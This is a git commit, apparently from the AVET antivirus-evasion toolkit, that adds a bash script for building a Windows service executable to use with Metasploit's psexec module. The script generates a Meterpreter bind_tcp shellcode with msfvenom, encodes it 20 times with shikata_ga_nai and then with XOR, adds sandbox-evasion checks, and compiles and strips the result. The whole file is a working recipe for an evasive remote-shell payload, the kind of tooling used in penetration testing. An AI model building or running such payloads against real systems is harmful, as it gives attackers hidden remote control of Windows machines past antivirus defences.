3dffc625d014a6beba41a72b863ac1eaccf7dc5e
Thund3rPat <patricksimuttis@gmail.com>
2020-01-15 08:53:35 -0500

    Change Spelling

---
+++ build/buildsvc_20xshikata_bindtcp_win32.sh
@@ -0,0 +1,67 @@
+#!/bin/bash          
+# Designed for use with msf psexec module!
+
+# print AVET logo
+cat banner.txt
+
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+
+# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
+msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f raw -a x86 --platform Windows > input/sc_raw.txt
+
+# import feature construction interface
+. build/feature_construction.sh
+
+# add evasion techniques
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+add_evasion gethostbyname_sandbox_evasion 'this.that'
+
+# generate key file
+generate_key preset aabbcc12de input/key_raw.txt
+
+# encode shellcode
+encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
+
+# array name buf is expected by static_from_file retrieval method
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
+
+# set shellcode source
+set_payload_source static_from_file input/scenc_c.txt
+
+# convert generated key from raw to C into array "key"
+./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
+
+# set key source
+set_key_source static_from_file input/key_c.txt
+
+# set payload info source
+set_payload_info_source no_data
+
+# set decoder
+set_decoder xor
+
+# set shellcode binding technique
+set_payload_execution_method exec_shellcode
+
+# enable debug printing
+enable_debug_print to_file C:/avetdbg.txt
+
+# compile
+$win32_compiler -o output/svc_20xshikata_bindtcp_win32.exe source/avetsvc.c -lws2_32
+strip output/svc_20xshikata_bindtcp_win32.exe
+
+# cleanup
+cleanup_techniques
